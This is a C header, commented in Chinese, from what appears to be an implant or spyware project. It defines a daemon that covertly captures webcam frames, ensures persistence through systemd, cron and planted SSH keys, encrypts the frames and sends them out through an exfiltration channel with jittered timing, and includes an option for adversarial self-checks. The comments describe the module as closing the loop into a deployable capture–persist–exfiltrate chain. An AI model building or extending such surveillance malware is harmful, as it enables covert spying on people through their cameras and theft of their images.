/*
 * agent_windows/include/cam_daemon.h
 *
 * 摄像头常驻守护：把「采集 — 驻留 — 回传」三段真正串成一条可部署链路。
 *
 * ====================================================================
 * 与既有模块的分工（本文件不重复实现任何一层）
 * ====================================================================
 *   采集   —— camera.h（后端可替换：mock / v4l2 / mf）
 *   编排   —— implant.h（采集 -> 打包 -> 回传 状态机 + 抖动退避）
 *   驻留   —— persist.h（persist_linux_ensure：落盘 + systemd/cron/sshkey）
 *   回传   —— exfil.h + exfil_link.h（AEAD 定长信元 + fd 传输）
 *
 * 本文件只做三件别人不做的事：
 *   1. 把 implant 的 pack/exfil 回调接到**真实** 21_exfil 通道上
 *      （此前 implant 的回传是测试里的假回调，链路从未真实闭合）
 *   2. 在运行前确保驻留（幂等，支持 root_prefix 假根以便测试）
 *   3. 守护进程化 + 信号停止 + pid 文件
 *
 * ====================================================================
 * 为什么 pack 不能是 identity（关键，改动前必读）
 * ====================================================================
 * implant.h 的硬规则：未注入 pack 回调时绝不回传明文。因此 pack 必须
 * 承担「明文 -> 密文」这唯一一次转换。本实现让 pack 直接产出 21_exfil
 * 的 AEAD 信元（线上恒 512 字节/信元），exfil 回调只负责把信元写进
 * sink fd。
 *
 * 若把 pack 写成 memcpy（identity）而把加密挪到 exfil 里，则一旦有人
 * 漏配 exfil 回调、或 exfil 失败重试，明文 JPEG 就会以某种形式落盘 /
 * 落链路。把加密固定在 pack 里，使「无 pack 即无数据」成为结构性保证。
 *
 * ====================================================================
 * sink 语义
 * ====================================================================
 *   "fd://N"   使用已打开的 fd N（由父进程/服务管理器传入，本进程不 close）
 *   "/path"    以 O_WRONLY|O_CREAT|O_APPEND 打开，本进程负责 close
 *   NULL       不回传。仅用于测试采集与驻留两段，不得用于部署。
 */

#ifndef DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H
#define DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H

#include "implant.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define CAM_DAEMON_PERSIST_N  3   /* {SYSTEMD, CRON, SSHKEY} */

typedef struct {
    const char *backend;      /* NULL = 按平台自动选择 */
    const char *root_prefix;  /* 驻留假根；NULL = 真实根（部署默认） */
    const char *sink_path;    /* 信元落点，见上；NULL = 不回传 */
    const char *pid_path;     /* NULL = 不写 pid 文件 */

    /* 采集参数 */
    uint32_t width, height, fps;
    uint32_t capture_ms;      /* 单次采集窗口，到点释放设备句柄 */
    uint32_t frames_per_batch;
    uint32_t jpeg_quality;    /* 1..100 */

    /* 节拍 */
    uint32_t interval_ms;
    uint32_t jitter_ms;       /* 抖动上限；固定间隔会在断线重连时形成同步爆发 */
    uint32_t max_batches;     /* 0 = 不限，由 stop 终止 */

    /* 回传密钥（方向分离，两端相反）；NULL 时使用内置测试密钥 */
    const uint8_t *k_send;
    const uint8_t *k_recv;
    const uint8_t *pfx;       /* 8 字节 nonce 前缀 */

    int daemonize;            /* 非 0 = 双 fork + setsid 后台化 */
    int ensure_persist;       /* 非 0 = 运行前确保驻留 */
    int run_defend;           /* 非 0 = 执行对抗自检（Windows 侧实现） */
} cam_daemon_cfg_t;

typedef struct {
    uint32_t batches;
    uint32_t frames;
    uint64_t bytes_out;       /* 实际写出信元字节数 */
    int      persist_rc;      /* persist_linux_ensure: 0=新装 1=已驻留 -1=失败 */
    int      methods[CAM_DAEMON_PERSIST_N];
    char     bin_path[4096];
    implant_err_t last_err;
} cam_daemon_stats_t;

/*
 * 运行守护主循环。阻塞直到跑完 max_batches、出错停止或被信号停止。
 * 成功返回 0；参数非法 -1；驻留失败 -2；采集源创建失败 -3；回传通道初始化失败 -4。
 * out_stats 可为 NULL。
 *
 * 注意：daemonize 会在本函数**内部**发生（驻留完成之后），因此调用方
 * 在 daemonize=1 时拿不到返回值 —— 部署方应依赖 pid 文件与 sink 落点
 * 判断存活，而不是依赖进程返回值。这是双 fork 的固有语义，不是缺陷。
 */
int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats);

/* 请求停止。由信号处理器调用；异步信号安全。 */
void cam_daemon_request_stop(void);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_CAM_DAEMON_H */
